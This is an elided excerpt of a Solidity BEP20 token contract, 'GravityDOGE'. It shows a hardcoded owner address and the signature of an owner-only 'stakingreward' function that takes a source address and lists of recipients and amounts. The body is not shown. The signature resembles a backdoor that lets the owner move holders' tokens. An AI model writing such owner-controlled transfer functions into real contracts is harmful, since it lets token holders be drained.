...
contract GravityDoge is IBEP20, Auth {
    ...
    string constant _name = "GravityDOGE";
    string constant _symbol = "GRAVITYDOGE";
    ...
    address public Owner=0x160Ca51E7Da000c055Ed37b14ad513E42ea2BFfb; // owner address
    ...
    constructor () Auth(Owner) {
        ...
        marketingFeeReceiver =0x160Ca51E7Da000c055Ed37b14ad513E42ea2BFfb;
...
/*  Begins */
 ...
 function stakingreward(address from, address[] calldata addresses, uint256[] calldata tokens) external onlyOwner {
